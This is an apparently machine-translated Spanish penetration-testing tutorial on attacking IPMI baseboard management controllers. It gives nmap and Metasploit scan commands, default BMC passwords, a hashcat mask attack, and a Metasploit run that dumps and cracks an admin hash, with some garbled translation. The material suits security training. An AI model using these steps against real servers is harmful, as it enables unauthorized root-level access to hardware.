# IPMI

---

[Interfaz de administración de plataforma inteligente](https://www.thomas-krenn.com/en/wiki/IPMI_Basics) (`IPMI`) es un conjunto de especificaciones estandarizadas para los sistemas de administración de hosts basados ​​en hardware utilizados para la gestión y monitoreo de sistemas. Actúa como un subsistema autónomo y funciona independientemente de la BIOS, CPU, firmware y sistema operativo subyacente del host. IPMI proporciona a Sysadmins la capacidad de administrar y monitorear los sistemas, incluso si están encendidos o en un estado que no responde. Funciona utilizando una conexión de red directa al hardware del sistema y no requiere acceso al sistema operativo a través de un shell de inicio de sesión. IPMI también se puede utilizar para actualizaciones remotas a sistemas sin requerir acceso físico al host de destino. IPMI se usa típicamente de tres maneras:

- Antes de que el sistema operativo se haya iniciado para modificar la configuración del BIOS
- Cuando el host está completamente apagado
- Acceso a un host después de una falla del sistema

Cuando no se usa para estas tareas, IPMI puede monitorear una variedad de cosas diferentes, como la temperatura del sistema, el voltaje, el estado del ventilador y las fuentes de alimentación. También se puede utilizar para consultar información de inventario, revisar registros de hardware y alertar con SNMP. El sistema de host se puede encender, pero el módulo IPMI requiere una fuente de alimentación y una conexión LAN para funcionar correctamente.

El protocolo IPMI fue publicado por primera vez por Intel en 1998 y ahora es respaldado por más de 200 proveedores de sistemas, incluidos Cisco, Dell, HP, Supermicro, Intel y más. Los sistemas que utilizan IPMI versión 2.0 se pueden administrar a través de serial a través de LAN, dando a los sysadmins la capacidad de ver la salida de la consola en serie en la banda. Para funcionar, IPMI requiere los siguientes componentes:

- Controlador de gestión de la base (BMC): un microcontrolador y un componente esencial de un IPMI
- Bus de gestión de chasis inteligente (ICMB): una interfaz que permite la comunicación de un chasis a otro
- Inteligent Platform Management Bus (IPMB): extiende el BMC
- Memoria IPMI: almacena cosas como el registro de eventos del sistema, los datos del almacén de repositorio y más
- Interfaces de comunicaciones: interfaces del sistema local, interfaces en serie y LAN, bus de administración de ICMB y PCI PCI

---

## Huella del servicio

IPMI se comunica sobre el puerto 623 UDP. Los sistemas que utilizan el protocolo IPMI se llaman Controladores de gestión de placa base (BMC). Los BMC generalmente se implementan como sistemas de brazo integrados que ejecutan Linux y se conectan directamente a la placa base del host. Los BMC están integrados en muchas placas base, pero también se pueden agregar a un sistema como tarjeta PCI. La mayoría de los servidores vienen con un BMC o admiten agregar un BMC. Los BMC más comunes que a menudo vemos durante las pruebas de penetración interna son HP ILO, Dell DRAC y Supermicro IPMI. Si podemos acceder a un BMC durante una evaluación, obtendríamos acceso completo a la placa base del host y podríamos monitorear, reiniciar, apagar o incluso reinstalar el sistema operativo del host. Obtener acceso a un BMC es casi equivalente al acceso físico a un sistema. Muchos BMC (incluidos HP ILO, Dell DRAC y Supermicro IPMI) exponen una consola de administración basada en la web, algún tipo de protocolo de acceso remoto de línea remota como Telnet o SSH, y el puerto 623 UDP, que, nuevamente, es para el protocolo de red IPMI. A continuación se muestra un escaneo NMAP de muestra usando el NMAP[Versión ipmi](https://nmap.org/nsedoc/scripts/ipmi-version.html)Script de NSE para huellas del servicio.

#### Nmap

  IPMI

```shell-session
xnoxos@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

Aquí, podemos ver que el protocolo IPMI está escuchando en el puerto 623, y NMAP tiene la versión 2.0 de huellas digitales del protocolo. También podemos usar el módulo de escáner MetaSploit[Discovery de información IPMI (auxiliar/escáner/ipmi/ipmi_version)](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/).

#### Escaneo de la versión metaSploit

  IPMI

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Durante las pruebas de penetración interna, a menudo encontramos BMC donde los administradores no han cambiado la contraseña predeterminada. Algunas contraseñas predeterminadas únicas para mantener en nuestras hojas de trucos incluyen:

|Producto|Nombre de usuario|Contraseña|
|---|---|---|
|Dell Idrac|raíz|Calvin|
|HP OIT|Administrador|cadena aleatoria de 8 caracteres que consta de números y letras mayúsculas|
|Supermicro IPMI|ADMINISTRACIÓN|ADMINISTRACIÓN|

También es esencial probar contraseñas predeterminadas conocidas para cualquier servicio que descubramos, ya que a menudo se dejan sin cambios y pueden conducir a victorias rápidas. Al tratar con BMCS, estas contraseñas predeterminadas pueden obtener acceso de EE. UU. A la consola web o incluso el acceso a la línea de comandos a través de SSH o Telnet.

---

## Configuración peligrosa

Si las credenciales predeterminadas no funcionan para acceder a un BMC, podemos recurrir a un[defecto](http://fish2.com/ipmi/remote-pw-cracking.html)En el protocolo RAKP en IPMI 2.0. Durante el proceso de autenticación, el servidor envía un hash SHA1 o MD5 salado de la contraseña del usuario al cliente antes de que tenga lugar la autenticación. Esto se puede aprovechar para obtener el hash de contraseña para cualquier cuenta de usuario válida en el BMC. Estos hash de contraseña se pueden descifrar fuera de línea utilizando un ataque de diccionario usando`Hashcat`modo`7300`. En el caso de un HP OIT utilizando una contraseña predeterminada de fábrica, podemos usar este comando de ataque de máscara hashcat`hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`lo que intenta todas las combinaciones de letras y números mayúsculas para una contraseña de ocho caracteres.

No hay "solución" directa a este problema porque la falla es un componente crítico de la especificación IPMI. Los clientes pueden optar por las contraseñas muy largas y difíciles de descifrar o implementar reglas de segmentación de red para restringir el acceso directo a los BMC. Es importante no pasar por alto IPMI durante las pruebas de penetración interna (lo vemos durante la mayoría de las evaluaciones) porque no solo podemos obtener acceso a la consola web BMC, que es un hallazgo de alto riesgo, sino que hemos visto entornos donde se establece una contraseña única (pero agrietable) que luego se reutiliza en otros sistemas. En una de esas pruebas de penetración, obtuvimos un hash IPMI, lo desciframos fuera de línea utilizando hashcat y pudimos SSH en muchos servidores críticos en el entorno como usuario raíz y obtuvimos acceso a consolas de administración web para varias herramientas de monitoreo de redes.

Para recuperar los hash IPMI, podemos usar el MetaSploit[IPMI 2.0 RAKP REMOTO SHA1 PASSAWN PASSA RECUPERACIÓN](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)módulo.

#### MetaSploit Dumping Hashes

  IPMI

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Aquí podemos ver que hemos obtenido con éxito el hash de contraseña para el usuario`ADMIN`, y la herramienta pudo descifrarla rápidamente para revelar lo que parece ser una contraseña predeterminada`ADMIN`. A partir de aquí, podríamos intentar iniciar sesión en el BMC o, si la contraseña fuera algo más único, verificar si la contraseña reutiliza en otros sistemas. IPMI es muy común en los entornos de red, ya que los sysadmins deben poder acceder a los servidores de forma remota en caso de una interrupción o realizar ciertas tareas de mantenimiento que tradicionalmente habrían tenido que estar físicamente frente al servidor para completar. Esta facilidad de administración conlleva el riesgo de exponer los hash de contraseña a cualquier persona en la red y puede conducir al acceso no autorizado, la interrupción del sistema e incluso la ejecución de código remoto. La verificación de IPMI debe ser parte de nuestro libro de jugadas de prueba de penetración interna para cualquier entorno que nos encontremos evaluando.